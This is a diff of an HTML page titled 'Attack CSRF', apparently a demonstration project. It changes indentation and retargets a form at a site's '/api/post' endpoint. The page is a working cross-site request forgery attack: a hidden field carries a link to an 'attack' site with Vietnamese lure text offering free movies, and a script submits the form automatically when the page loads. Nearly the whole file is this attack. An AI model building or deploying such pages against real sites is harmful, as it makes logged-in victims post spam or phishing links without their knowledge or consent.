@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Attack CSRF</title>
-    </head>
-    <body>
-        <form action="https://csrf.onrender.com/api/post" method="get">
-            <div>
-                <input
-                    type="hidden"
-                    name="content"
-                    value="<a style='color: blue' href='https://csrf-attack.onrender.com/'>đăng kí</a> để nhận 1 tháng xem phim miễn phí 💥"
-                />
-            </div>
-        </form>
-        <script>
-            document.addEventListener("DOMContentLoaded", () => {
-                console.log(document.querySelector("form"));
-                document.querySelector("form").submit();
-            });
-        </script>
-    </body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attack CSRF</title>
+  </head>
+  <body>
+    <form action="https://csrf-site.herokuapp.com/api/post" method="get">
+      <div>
+        <input
+          type="hidden"
+          name="content"
+          value="<a style='color: blue' href='https://csrf-attack.onrender.com/'>đăng kí</a> để nhận 1 tháng xem phim miễn phí 💥"
+        />
+      </div>
+    </form>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        console.log(document.querySelector("form"));
+        document.querySelector("form").submit();
+      });
+    </script>
+  </body>
 </html>
